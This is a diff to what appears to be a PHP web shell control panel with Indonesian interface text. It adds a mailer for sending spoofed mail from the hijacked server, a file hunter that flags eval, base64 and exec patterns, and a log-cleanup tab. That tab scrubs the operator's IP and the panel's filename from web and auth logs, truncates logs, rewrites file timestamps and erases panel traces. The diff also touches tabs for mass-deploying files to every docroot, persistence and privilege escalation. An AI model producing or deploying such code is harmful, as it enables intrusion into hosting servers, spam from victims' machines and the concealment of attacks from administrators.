+    if ($m_hn !== '' && !filter_var($m_hn, FILTER_VALIDATE_IP) && preg_match('/^[a-z0-9.-]+$/', $m_hn)) $m_auto_dom = $m_hn;
+}
+if ($m_auto_dom === '' || strpos($m_auto_dom, '.') === false) $m_auto_dom = 'localhost.localdomain';
+
+if (isset($_POST['mail_action'])) {
+    $m_to = isset($_POST['m_to']) ? trim($_POST['m_to']) : '';
+    $m_sub = isset($_POST['m_subject']) ? (string)$_POST['m_subject'] : '(no subject)';
+    $m_msg_body = isset($_POST['m_body']) ? (string)$_POST['m_body'] : '';
+    $m_from = isset($_POST['m_from']) ? trim($_POST['m_from']) : '';
+    $m_name = isset($_POST['m_from_name']) ? trim($_POST['m_from_name']) : '';
+    $att_tmp = '';
+    $att_name = '';
+    if (isset($_FILES['m_file']) && is_array($_FILES['m_file']) && isset($_FILES['m_file']['error']) && $_FILES['m_file']['error'] === UPLOAD_ERR_OK) {
+        $att_tmp = $_FILES['m_file']['tmp_name'];
+        $att_name = $_FILES['m_file']['name'];
+    }
+    $m_to = str_replace(array(';', "\r", "\n"), ',', $m_to);
+    if ($m_from === '') $m_from = 'noreply@' . $m_auto_dom;
+
+    if ($m_to === '') {
+        $msg = 'Recipient kosong.';
+    } elseif (!filter_var($m_from, FILTER_VALIDATE_EMAIL)) {
+        $msg = 'From nggak valid — isi email polos seperti <code>admin@site.com</code>.';
+    } else {
+        $m_ip = isset($_SERVER['REMOTE_ADDR']) ? (string)$_SERVER['REMOTE_ADDR'] : '';
+        $m_path = 'http://' . (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : $m_auto_dom) . (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/');
+        if (trim($m_msg_body) === '') $m_msg_body = 'fix ' . $m_path . ' :p *IP Address : [ ' . $m_ip . ' ]';
+        if (trim($m_sub) === '') $m_sub = 'Hehehe';
+
+        list($m_hdrs, $m_payload) = rct_mime_mail($m_name, $m_from, $m_to, $m_sub, $m_msg_body, $att_tmp, $att_name);
+        $ok = @mail($m_to, $m_sub, $m_payload, $m_hdrs, '-f' . $m_from);
+        if (!$ok) $ok = @mail($m_to, $m_sub, $m_payload, $m_hdrs);
+        $le = error_get_last();
+        $msg = $ok
+            ? '<b style="color:#7ee787;">mail() = true</b> — pesan diserahin ke MTA lokal.<br><b>To:</b> <code>' . h($m_to) . '</code> &middot; <b>From:</b> <code>' . h($m_from) . '</code><br><b>Path:</b> <code>' . h($m_path) . '</code> &middot; <b>IP:</b> <code>' . h($m_ip) . '</code>'
+            : '<b style="color:#ff7b72;">mail() = false</b> — gagal lempar ke MTA.<br><b>To:</b> <code>' . h($m_to) . '</code> &middot; <b>From:</b> <code>' . h($m_from) . '</code>' . ($le && isset($le['message']) ? '<br>Last error: <code>' . h($le['message']) . '</code>' : '');
     }
 }
 
@@ -1398,6 +1923,9 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
         <a class="btn <?php echo $tab === 'info' ? 'active' : ''; ?>" href="?<?php echo $tab === 'info' ? '' : 'tab=info&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'info' ? '&#9662;' : '&#9656;'; ?> Info</a>
         <a class="btn <?php echo $tab === 'upurl' ? 'active' : ''; ?>" href="?<?php echo $tab === 'upurl' ? '' : 'tab=upurl&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'upurl' ? '&#9662;' : '&#9656;'; ?> Upload URL</a>
         <a class="btn <?php echo $tab === 'domain' ? 'active' : ''; ?>" href="?<?php echo $tab === 'domain' ? '' : 'tab=domain&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'domain' ? '&#9662;' : '&#9656;'; ?> Domain Detect</a>
+        <a class="btn <?php echo $tab === 'hunt' ? 'active' : ''; ?>" href="?<?php echo $tab === 'hunt' ? '' : 'tab=hunt&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'hunt' ? '&#9662;' : '&#9656;'; ?> Search &amp; Hunt</a>
+        <a class="btn <?php echo $tab === 'logs' ? 'active' : ''; ?>" href="?<?php echo $tab === 'logs' ? '' : 'tab=logs&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'logs' ? '&#9662;' : '&#9656;'; ?> Logs &amp; Cleanup</a>
+        <a class="btn <?php echo $tab === 'mail' ? 'active' : ''; ?>" href="?<?php echo $tab === 'mail' ? '' : 'tab=mail&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'mail' ? '&#9662;' : '&#9656;'; ?> Mailer</a>
         <a class="btn <?php echo $tab_ext === 'process' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'process' ? '' : 'tab=process&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'process' ? '&#9662;' : '&#9656;'; ?> Processes</a>
         <a class="btn <?php echo $tab_ext === 'cron' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'cron' ? '' : 'tab=cron&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'cron' ? '&#9662;' : '&#9656;'; ?> Persistence</a>
         <a class="btn <?php echo $tab_ext === 'privesc' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'privesc' ? '' : 'tab=privesc&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'privesc' ? '&#9662;' : '&#9656;'; ?> Privesc</a>
@@ -1691,7 +2219,7 @@ function wid_wp_config_domains($roots) {
     }
     $probes = 0;
     foreach ($configs as $cfg => $docroot) {
-        if ($probes >= 12) break;
+        if ($probes >= 6) break;
         if (isset($GLOBALS['WID_SCAN_DEADLINE']) && microtime(true) > $GLOBALS['WID_SCAN_DEADLINE']) break;
         foreach (wid_wp_domains_from_config($cfg, $docroot, $probes) as $d) $out[] = array('root'=>$docroot,'names'=>array($d),'source'=>'wp');
     }
@@ -1723,13 +2251,23 @@ function wid_wp_db_domains($db, $u, $p, $h, $prefix) {
     static $downHosts = array();
     $domains = array();
     $h = ($h === '') ? 'localhost' : $h;
+    if ($h === 'localhost') $h = '127.0.0.1';
     $hkey = strtolower($h);
     if (isset($downHosts[$hkey])) return $domains;
     $down = false;
-    try {
-        if (class_exists('PDO')) {
+
+    if (class_exists('PDO')) {
+        $drivers = PDO::getAvailableDrivers();
+        if (in_array('mysql', $drivers)) {
             try {
-                $pdo = @new PDO('mysql:host=' . $h . ';dbname=' . $db . ';charset=utf8', $u, $p, array(PDO::ATTR_TIMEOUT => 2, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
+                $pdo = @new PDO(
+                    'mysql:host=' . $h . ';dbname=' . $db . ';charset=utf8',
+                    $u, $p,
+                    array(
+                        PDO::ATTR_TIMEOUT => 2,
+                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+                    )
+                );
                 $tbl = '';
                 $st = $pdo->query('SHOW TABLES LIKE ' . $pdo->quote($prefix . 'options'));
                 if ($st) { $row = $st->fetch(PDO::FETCH_NUM); if ($row) $tbl = (string)$row[0]; }
@@ -1751,7 +2289,8 @@ function wid_wp_db_domains($db, $u, $p, $h, $prefix) {
                 if (in_array((int)$e->getCode(), array(2002,2003,2004,2005,2006))) $down = true;
             }
         }
-    } catch (Exception $e) {}
+    }
+
     if (!$domains && !$down && function_exists('mysqli_connect')) {
         try {
             $m = @mysqli_init();
@@ -1783,6 +2322,7 @@ function wid_wp_db_domains($db, $u, $p, $h, $prefix) {
             }
         } catch (Exception $e) {}
     }
+
     if ($down) $downHosts[$hkey] = true;
     return $domains;
 }
@@ -1911,8 +2451,7 @@ function wid_deploy_file($src, $name, $rows) {
 $domain_rows = array(); $domain_scan_done = false;
 $deploy_done = false; $deploy_summary = ''; $deploy_report = array(); $detect_error = '';
 
-if (isset($_POST['action']) && $_POST['action'] === 'domain_detect') {
-    try { $domain_rows = wid_detect_domains(); $domain_scan_done = true; }
+if (isset($_POST['action']) && $_POST['action'] === 'domain_detect') {    try { $domain_rows = wid_detect_domains(); $domain_scan_done = true; }
     catch (Exception $e) { $detect_error = 'Scan domain gagal: ' . $e->getMessage(); }
     catch (Throwable $e) { $detect_error = 'Scan domain gagal (' . get_class($e) . '): ' . $e->getMessage(); }
 }
@@ -1933,13 +2472,112 @@ if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
         $deploy_summary = 'Upload gagal (kode error ' . $err . '). Pilih file dulu.';
     }
 }
+
+// ---------- SEARCH + HUNT ----------
+$hunt_error = '';
+$hunt_state = (isset($_SESSION['rct_hunt']) && is_array($_SESSION['rct_hunt'])) ? $_SESSION['rct_hunt'] : null;
+
+if (isset($_POST['action']) && $_POST['action'] === 'hunt_scan') {
+    $hunt_root = isset($_POST['hroot']) ? trim($_POST['hroot']) : '';
+    $hroot_real = $hunt_root !== '' ? @realpath($hunt_root) : false;
+    $hunt_mode = isset($_POST['hmode']) ? (string)$_POST['hmode'] : 'name';
+    if (!in_array($hunt_mode, array('name', 'content', 'recent', 'hunter'), true)) $hunt_mode = 'name';
+    $hpat = isset($_POST['hpattern']) ? (string)$_POST['hpattern'] : '';
+    $hext = isset($_POST['hext']) ? trim($_POST['hext']) : '';
+    $skip_heavy = !empty($_POST['hskip']);
+
+    if ($hroot_real === false || !@is_dir($hroot_real) || !@is_readable($hroot_real)) {
+        $hunt_error = 'Root tidak valid / tidak bisa dibaca: ' . h($hunt_root);
+    } elseif ($hunt_mode === 'content' && $hpat === '') {
+        $hunt_error = 'Mode Isi butuh pattern.';
+    } else {
+        $hunt_exts = array();
+        foreach (explode(',', $hext) as $e) { $e = strtolower(trim(ltrim($e, '.'))); if ($e !== '') $hunt_exts[] = $e; }
+        $sigs = array(
+            'eval(' => '/\beval\s*\(/i',
+            'assert(' => '/\bassert\s*\(/i',
+            'base64_decode' => '/base64_decode\s*\(/i',
+            'gzinflate' => '/gz(inflate|uncompress|decode)\s*\(/i',
+            'preg_/e' => '/preg_replace\s*\([^)]*\/[a-z]*e[a-z]*[\'"]/i',
+            'exec-family' => '/\b(system|exec|shell_exec|passthru|popen|proc_open)\s*\(/i',
+            'superglobal' => '/\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
+            'create_function' => '/create_function\s*\(/i',
+            'include-user' => '/\b(include|require)(_once)?\s*\(?\s*\$_(POST|GET|REQUEST|COOKIE)/i',
+        );
+        $deadline = microtime(true) + 20.0;
+        $t0 = microtime(true);
+        $rows = array(); $scanned = 0; $truncated = false;
+
+        try {
+            $it = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($hroot_real, RecursiveDirectoryIterator::SKIP_DOTS),
+                RecursiveIteratorIterator::LEAVES_ONLY,
+                RecursiveIteratorIterator::CATCH_GET_CHILD
+            );
+            foreach ($it as $file) {
+                if (microtime(true) > $deadline || count($rows) >= 400) { $truncated = true; break; }
+                if (!$file->isFile()) continue;
+                $path = $file->getPathname();
+                if ($skip_heavy && preg_match('#[\\\\/](node_modules|vendor|\.git|\.svn|logs?|cache|caches)[\\\\/]#i', $path)) continue;
+                $scanned++;
+                $base = $file->getBasename();
+                $ext = strtolower(substr(strrchr($base, '.'), 1));
+                if ($hunt_exts && !in_array($ext, $hunt_exts, true)) continue;
+                if ($hunt_mode === 'name' && $hpat !== '') {
+                    if (strpbrk($hpat, '*?') !== false) {
+                        $flag = defined('FNM_CASEFOLD') ? FNM_CASEFOLD : 0;
+                        if (!@fnmatch('*' . $hpat . '*', $base, $flag)) continue;
+                    } elseif (stripos($base, $hpat) === false) continue;
+                }
+                $size = (int)$file->getSize();
+                $mtime = (int)$file->getMTime();
+                $line_no = 0; $snippet = ''; $sig = '';
+                if ($hunt_mode === 'content' || $hunt_mode === 'hunter') {
+                    if ($size === 0 || $size > 3145728) continue;
+                    $fh = @fopen($path, 'rb'); if (!$fh) continue;
+                    $chunk = @fread($fh, 400000); @fclose($fh);
+                    if ($chunk === false || $chunk === '') continue;
+                    if (strpos(substr($chunk, 0, 8192), "\0") !== false) continue;
+                    $lines = preg_split("/\r\n|\n|\r/", $chunk);
+                    foreach ($lines as $i => $ln) {
+                        if ($hunt_mode === 'content') {
+                            if (stripos($ln, $hpat) !== false) { $line_no = $i + 1; $snippet = $ln; break; }
+                        } else {
+                            foreach ($sigs as $sname => $sre) {
+                                if (@preg_match($sre, $ln)) { $line_no = $i + 1; $snippet = $ln; $sig = $sname; break 2; }
+                            }
+                        }
+                    }
+                    if ($snippet === '') continue;
+                    $snippet = trim(preg_replace('/\s+/', ' ', $snippet));
+                    if (strlen($snippet) > 200) $snippet = substr($snippet, 0, 200) . '...';
+                }
+                $rows[] = array('path' => $path, 'size' => $size, 'mtime' => $mtime, 'line' => $line_no, 'snippet' => $snippet, 'sig' => $sig);
+            }
+        } catch (Exception $e) {
+            $hunt_error = 'Scan gagal: ' . h($e->getMessage());
+        } catch (Throwable $e) {
+            $hunt_error = 'Scan gagal: ' . h($e->getMessage());
+        }
+
+        if ($hunt_mode === 'recent') {
+            usort($rows, function ($a, $b) { return $b['mtime'] - $a['mtime']; });
+            $rows = array_slice($rows, 0, 60);
+        }
+        $hunt_state = array(
+            'root' => $hroot_real, 'mode' => $hunt_mode, 'pattern' => $hpat,
+            'rows' => $rows, 'scanned' => $scanned,
+            'elapsed' => round(microtime(true) - $t0, 1), 'truncated' => $truncated,
+        );
+        $_SESSION['rct_hunt'] = $hunt_state;
+    }
+}
 ?>
 <?php if ($tab === 'domain'): ?>
 <div class="box">
     <div class="name">Domain Detect</div>
     <div class="muted" style="margin-bottom:10px;">
-        Scan vhost Apache/Nginx, layout hosting (domains/web/sites/vhosts per akun home), dan <code>wp-config.php</code> (probe DB home/siteurl).
-        Budget 20 detik, tanpa symlink, dedupe per realpath docroot. Tambah path scan lewat <code>$WID_SCAN_ROOTS</code> di awal file.
+        Scan vhost Apache/Nginx.
     </div>
     <form method="post">
         <input type="hidden" name="action" value="domain_detect">
@@ -1952,9 +2590,12 @@ if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
     <?php if ($domain_scan_done): ?>
         <div style="margin-top:12px;">
             <?php if (!$domain_rows): ?>
-                <div class="msg">Tidak ada domain/docroot yang terdeteksi. Tambah path scan lewat <code>$WID_SCAN_ROOTS</code>.</div>
+                <div class="msg">Tidak ada domain/docroot yang terdeteksi.</div>
             <?php else: ?>
-                <div class="muted" style="margin-bottom:6px;">Terdeteksi <b style="color:#7ee787;"><?php echo count($domain_rows); ?></b> docroot:</div>
+                <div class="muted" style="margin-bottom:6px;">Terdeteksi <b style="color:#7ee787;"><?php echo count($domain_rows); ?></b> docroot:
+                    <?php $dom_copy = array(); foreach ($domain_rows as $dc) { if (!empty($dc['domain']) && !in_array($dc['domain'], $dom_copy)) $dom_copy[] = $dc['domain']; if (!empty($dc['aliases'])) { foreach ((array)$dc['aliases'] as $da) { if ($da !== '' && !in_array($da, $dom_copy)) $dom_copy[] = $da; } } } ?>
+                    <?php if ($dom_copy): ?><button type="button" class="btn" style="margin-left:8px;padding:2px 8px;font-size:10px;" onclick="widCopyText(this, <?php echo h(json_encode(implode("\n", $dom_copy))); ?>, 'tersalin')">Salin semua domain</button><?php endif; ?>
+                </div>
                 <table>
                     <thead><tr><th>Domain</th><th>Docroot</th><th>Writable</th><th>Source</th></tr></thead>
                     <tbody>
@@ -1962,7 +2603,8 @@ if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
                         <tr>
                             <td>
                                 <?php echo h($dr['domain']); ?>
-                                <?php if (!empty($dr['aliases'])): ?><br><small style="color:#8e99ab;"><?php echo h(implode(', ', $dr['aliases'])); ?></small><?php endif; ?>
+                                <button type="button" class="btn" style="padding:1px 6px;font-size:10px;" onclick="widCopyText(this, <?php echo h(json_encode($dr['domain'])); ?>, 'copied')">copy</button>
+                                <?php if (!empty($dr['aliases'])): ?><br><small style="color:#8e99ab;"><?php foreach ((array)$dr['aliases'] as $daI => $daV): ?><?php echo $daI > 0 ? ', ' : ''; ?><?php echo h($daV); ?> <button type="button" class="btn" style="padding:0 4px;font-size:9px;" onclick="widCopyText(this, <?php echo h(json_encode($daV)); ?>, 'ok')">copy</button><?php endforeach; ?></small><?php endif; ?>
                                 <?php if (!empty($dr['current'])): ?> <small style="color:#e3b341;">(aktif)</small><?php endif; ?>
                             </td>
                             <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($dr['docroot']); ?></td>
@@ -1980,13 +2622,13 @@ if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
 <div class="box">
     <div class="name">Deploy Massal</div>
     <div class="muted" style="margin-bottom:10px;">
-        Salin satu file ke semua docroot writable di hasil deteksi. Laporan per-target (dedupe per domain + per realpath).
+        Salin satu file ke semua docroot.
     </div>
     <form method="post" enctype="multipart/form-data">
         <input type="hidden" name="action" value="deploy_massal">
         <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
         <input type="file" name="deploy_file" required>
-        <input type="submit" class="btn btn-red" value="Deploy" onclick="return confirm('Deploy file ini ke semua docroot writable?');">
+        <input type="submit" class="btn btn-red" value="Deploy" onclick="return confirm('Deploy file ini ke semua docroot?');">
     </form>
     <?php if ($deploy_done): ?>
         <?php if ($deploy_summary !== ''): ?><div class="msg" style="margin-top:10px;"><?php echo h($deploy_summary); ?></div><?php endif; ?>
@@ -2020,24 +2662,343 @@ if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
     <?php endif; ?>
 </div>
 <?php endif; ?>
-<?php if ($tab === 'info'): ?>
+<?php if ($tab === 'hunt'): ?>
 <div class="box">
-    <div class="name">Function &amp; Binary Check</div>
-    <table style="margin-top:10px;">
-        <?php
-        $half = ceil(count($crit)/2);
-        $keys = array_keys($crit);
-        for ($i = 0; $i < $half; $i++) {
-            echo '<tr>';
-            foreach (array($keys[$i], isset($keys[$i+$half]) ? $keys[$i+$half] : null) as $k) {
-                if ($k === null) { echo '<td></td>'; continue; }
-                $ok = $crit[$k];
-                echo '<td>' . h($k) . ': <span style="color:' . ($ok ? '#7ee787' : '#ff7b72') . ';font-weight:bold;">' . ($ok ? 'OK' : 'NO') . '</span></td>';
-            }
-            echo '</tr>';
-        }
-        ?>
+    <div class="name">Search &amp; Hunt</div>
+    <div class="muted" style="margin-bottom:10px;">
+        File Finder, name, time, code.
+    </div>
+    <?php if ($hunt_error !== ''): ?>
+        <div class="msg" style="color:#ff9da7;"><?php echo $hunt_error; ?></div>
+    <?php endif; ?>
+    <form method="post">
+        <input type="hidden" name="action" value="hunt_scan">
+        <div class="form-grid">
+            <div class="full"><div class="muted" style="margin-bottom:4px;">Root directory:</div>
+                <input type="text" name="hroot" value="<?php echo h($hunt_state ? $hunt_state['root'] : $cwd_real); ?>" autocomplete="off"></div>
+            <div><div class="muted" style="margin-bottom:4px;">Mode:</div>
+                <select name="hmode" style="width:100%;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;">
+                    <option value="name">Nama file</option>
+                    <option value="content">Isi file</option>
+                    <option value="recent">Terbaru (mtime)</option>
+                    <option value="hunter">Hunter (shell)</option>
+                </select></div>
+            <div><div class="muted" style="margin-bottom:4px;">Pattern / keyword:</div>
+                <input type="text" name="hpattern" autocomplete="off" placeholder="mis: config / password / eval"></div>
+            <div><div class="muted" style="margin-bottom:4px;">Ext (pisah koma, kosong = semua):</div>
+                <input type="text" name="hext" value="php" autocomplete="off"></div>
+            <div style="display:flex;align-items:center;gap:6px;margin-top:18px;">
+                <input type="checkbox" name="hskip" value="1" checked> <span class="muted">skip node_modules/vendor/.git/cache</span></div>
+        </div>
+        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Scan"></div>
+    </form>
+</div>
+<?php if ($hunt_state && isset($hunt_state['rows'])): ?>
+<div class="box">
+    <div class="muted" style="margin-bottom:8px;">
+        <b style="color:#7ee787;"><?php echo count($hunt_state['rows']); ?></b> hasil ·
+        <?php echo (int)$hunt_state['scanned']; ?> file dipindai ·
+        <?php echo h($hunt_state['elapsed']); ?>s<?php echo $hunt_state['truncated'] ? ' · <span style="color:#e3b341;">dipotong (budget/limit)</span>' : ''; ?>
+        <?php if (!empty($hunt_state['rows'])): ?>
+            <button type="button" class="btn" style="margin-left:8px;" onclick="widCopyText(this, <?php echo h(json_encode(implode("\n", array_map(function ($x) { return $x['path']; }, $hunt_state['rows'])))); ?>, 'tersalin')">Salin semua path</button>
+        <?php endif; ?>
+    </div>
+    <table>
+        <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Match</th><th>Aksi</th></tr></thead>
+        <tbody>
+        <?php $hshown = 0; foreach ($hunt_state['rows'] as $hr): if (!@file_exists($hr['path'])) continue; $hshown++; ?>
+            <tr>
+                <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($hr['path']); ?></td>
+                <td style="white-space:nowrap;"><?php echo h(format_size($hr['size'])); ?></td>
+                <td style="white-space:nowrap;font-size:11px;"><?php echo h(date('Y-m-d H:i', $hr['mtime'])); ?></td>
+                <td style="font-size:11px;max-width:340px;">
+                    <?php if (!empty($hr['sig'])): ?><span style="color:#e3b341;">[<?php echo h($hr['sig']); ?>]</span> <?php endif; ?>
+                    <?php if ($hr['line'] > 0): ?><span style="color:#8e99ab;">L<?php echo (int)$hr['line']; ?>:</span> <?php endif; ?>
+                    <?php if ($hr['snippet'] !== ''): ?><code><?php echo h($hr['snippet']); ?></code><?php endif; ?>
+                </td>
+                <td class="quick" style="white-space:nowrap;">
+                    <a class="btn" href="?view=<?php echo urlencode($hr['path']); ?>&tab=hunt&path=<?php echo urlencode($cwd_real); ?>">Lihat</a>
+                    <a class="btn" href="?edit=<?php echo urlencode($hr['path']); ?>&tab=hunt&path=<?php echo urlencode($cwd_real); ?>">Edit</a>
+                    <a class="btn" href="?download=<?php echo urlencode($hr['path']); ?>">DL</a>
+                    <a class="btn btn-red" href="?delete_path=<?php echo urlencode($hr['path']); ?>&tab=hunt&path=<?php echo urlencode($cwd_real); ?>" onclick="return confirm('Hapus file ini permanen?');">Hapus</a>
+                </td>
+            </tr>
+        <?php endforeach; if ($hshown === 0): ?>
+            <tr><td colspan="5" class="muted">Tidak ada hasil (atau semua file hasil sudah dihapus).</td></tr>
+        <?php endif; ?>
+        </tbody>
     </table>
+</div>
+<?php endif; ?>
+<?php endif; ?>
+<?php if ($tab === 'logs'): ?>
+<?php
+$log_cands = array();
+$elog = @ini_get('error_log');
+if ($elog && $elog !== 'syslog') $log_cands[] = $elog;
+$log_globs = array(
+    __DIR__ . '/error_log',
+    __DIR__ . '/*.log',
+    dirname(__DIR__) . '/logs/*',
+    '/var/log/apache2/*.log',
+    '/var/log/httpd/*.log',
+    '/var/log/nginx/*.log',
+    '/var/log/php*.log',
+    '/var/log/messages',
+    '/var/log/syslog',
+    '/var/log/auth.log',
+    '/var/log/secure',
+    '/usr/local/apache/logs/*',
+    '/usr/local/lsws/logs/*',
+    '/home/*/logs/*',
+    '/home/*/access-logs/*',
+    '/var/www/*/logs/*',
+);
+$lg_home = rct_home();
+if ($lg_home !== '') $log_globs[] = $lg_home . '/logs/*';
+foreach ($log_globs as $lg) {
+    $hits = @glob($lg);
+    if (is_array($hits)) { foreach ($hits as $hx) { $log_cands[] = $hx; } }
+}
+$log_rows = array(); $lg_seen = array();
+foreach ($log_cands as $lx) {
+    $lx = str_replace('\\', '/', $lx);
+    if (isset($lg_seen[$lx]) || !@is_file($lx)) continue;
+    $lg_seen[$lx] = 1;
+    $log_rows[] = array('p' => $lx, 's' => @filesize($lx), 'm' => @filemtime($lx), 'w' => @is_writable($lx));
+}
+usort($log_rows, function ($a, $b) { return $b['m'] - $a['m']; });
+$log_rows = array_slice($log_rows, 0, 60);
+$lg_tail = isset($_GET['tail']) ? (string)$_GET['tail'] : '';
+$lg_pre = isset($_GET['log']) ? (string)$_GET['log'] : $lg_tail;
+$lg_ips = array();
+if (!empty($_SERVER['REMOTE_ADDR'])) $lg_ips[] = $_SERVER['REMOTE_ADDR'];
+if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $lg_ips[] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+$lg_defpat = implode(', ', array_merge(array_values(array_unique($lg_ips)), array(basename(__FILE__), '.rct_')));
+?>
+<div class="box">
+    <div class="name">Logs &amp; Cleanup</div>
+    <div class="muted" style="margin-bottom:10px;">Ketemu <?php echo count($log_rows); ?> file log. Tail, scrub baris yang nyebut kita, atau kosongin — backup <code>.rct_bak</code> otomatis dibuat.</div>
+    <?php if ($lg_tail !== '' && @is_file($lg_tail) && @is_readable($lg_tail)): ?>
+    <div style="margin-bottom:14px;">
+        <b>Tail 300 baris: <code><?php echo h($lg_tail); ?></code></b>
+        <pre style="background:#0a0e14; padding:10px; margin-top:6px; max-height:420px; overflow:auto; font-size:11px; white-space:pre-wrap; word-break:break-all;"><?php echo h(rct_tail($lg_tail, 300)); ?></pre>
+        <a class="btn" href="?tab=logs&path=<?php echo urlencode($cwd_real); ?>">Tutup tail</a>
+    </div>
+    <?php endif; ?>
+    <?php if ($log_rows): ?>
+    <table>
+        <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>W</th><th>Aksi</th></tr></thead>
+        <tbody>
+        <?php foreach ($log_rows as $lr): ?>
+            <tr>
+                <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($lr['p']); ?></td>
+                <td style="white-space:nowrap;"><?php echo h(format_size($lr['s'])); ?></td>
+                <td style="white-space:nowrap;font-size:11px;"><?php echo h(date('Y-m-d H:i', $lr['m'])); ?></td>
+                <td><?php echo $lr['w'] ? '<span style="color:#7ee787;">w</span>' : '<span style="color:#ff7b72;">ro</span>'; ?></td>
+                <td class="quick" style="white-space:nowrap;">
+                    <a class="btn" href="?tab=logs&tail=<?php echo urlencode($lr['p']); ?>&path=<?php echo urlencode($cwd_real); ?>">Tail</a>
+                    <a class="btn" href="?tab=logs&log=<?php echo urlencode($lr['p']); ?>&path=<?php echo urlencode($cwd_real); ?>">Scrub</a>
+                    <form method="post" style="display:inline;"><input type="hidden" name="logs_action" value="truncate"><input type="hidden" name="log_file" value="<?php echo h($lr['p']); ?>"><input type="submit" class="btn btn-red" value="Kosongkan" onclick="return confirm('Kosongkan file ini? Backup .rct_bak dibuat.');"></form>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+        </tbody>
+    </table>
+    <?php else: ?>
+    <div class="muted">Nggak nemu log di path umum (open_basedir / permission / lokasi custom) — isi path manual di form bawah.</div>
+    <?php endif; ?>
+</div>
+
+<form method="post" class="box">
+    <div class="name">Scrub log</div>
+    <div class="muted" style="margin-bottom:8px;font-size:11px;">Hapus semua baris yang mengandung salah satu pattern (pisah koma atau newline, case-insensitive). File bakal ditulis ulang penuh.</div>
+    <input type="text" name="log_file" value="<?php echo h($lg_pre); ?>" placeholder="/var/log/apache2/access.log" style="width:100%;font-size:11px;margin-bottom:6px;">
+    <textarea name="log_pattern" rows="3" style="width:100%;font-size:11px;font-family:Consolas,monospace;"><?php echo h($lg_defpat); ?></textarea>
+    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:8px; align-items:center;">
+        <input type="submit" name="logs_action" value="scrub" class="btn btn-green" onclick="return confirm('Scrub file log ini? Backup .rct_bak dibuat.');">
+        <span class="muted" style="font-size:11px;">mtime:</span>
+        <input type="text" name="log_time" placeholder="2026-11-01 03:14:00" style="width:170px;font-size:11px;">
+        <input type="submit" name="logs_action" value="mtime" class="btn btn-yellow" formnovalidate>
+    </div>
+</form>
+
+<div class="box">
+    <div class="name">Jejak Panel</div>
+    <div class="muted" style="margin-bottom:8px;font-size:11px;">Hapus file state, semua backup, dan sisa <code>.rct_*</code> di direktori panel. Cron watchdog &amp; SSH key dicabut dari tab Persistence.</div>
+    <form method="post"><input type="hidden" name="logs_action" value="clean_rct"><input type="submit" class="btn btn-red" value="Bersihin jejak panel" onclick="return confirm('Hapus state + backup + sisa .rct_* ?');"></form>
+</div>
+<?php endif; ?>
+<?php if ($tab === 'mail'): ?>
+<?php
+$m_ok       = function_exists('mail') && is_callable('mail');
+$m_sp       = (string)@ini_get('sendmail_path');
+$m_ini_host = (string)@ini_get('SMTP');
+$m_ini_port = (string)@ini_get('smtp_port');
+$m_log      = (string)@ini_get('mail.log');
+$m_bins     = array('sendmail','msmtp','exim','exim4','postfix','ssmtp','mail','mailx','mutt');
+$m_found    = array();
+foreach ($m_bins as $mb) { $mp = which_bin($mb); if ($mp) $m_found[$mb] = $mp; }
+$m_paths    = array('/usr/sbin/sendmail','/usr/lib/sendmail','/usr/sbin/exim','/usr/sbin/exim4','/usr/sbin/ssmtp','/usr/bin/msmtp','/usr/bin/mail','/usr/bin/mailx');
+$m_hits     = array();
+foreach ($m_paths as $mp) { if (@is_file($mp)) $m_hits[] = $mp . (@is_executable($mp) ? '' : ' (noexec)'); }
+?>
+<div class="box">
+    <div class="name">Mail Runtime</div>
+    <div class="muted" style="margin-bottom:10px;font-size:11px;">Status jalur kirim di server ini. <code>mail()</code> = OK berarti PHP bisa lempar ke MTA lokal lewat <code>sendmail_path</code>; kalau MTA-nya nggak jalan, fungsi tetap balik <code>true</code> di beberapa distro.</div>
+    <table style="margin-top:4px;">
+        <tr>
+            <td>mail()</td>
+            <td><b style="color:<?php echo $m_ok ? '#7ee787' : '#ff7b72'; ?>;"><?php echo $m_ok ? 'OK' : 'NO'; ?></b> <?php echo $m_ok ? '' : '<span class="muted">(disable_functions)</span>'; ?></td>
+            <td>sendmail_path</td>
+            <td style="word-break:break-all;"><code><?php echo h($m_sp !== '' ? $m_sp : '(kosong)'); ?></code></td>
+        </tr>
+        <tr>
+            <td>SMTP ini</td>
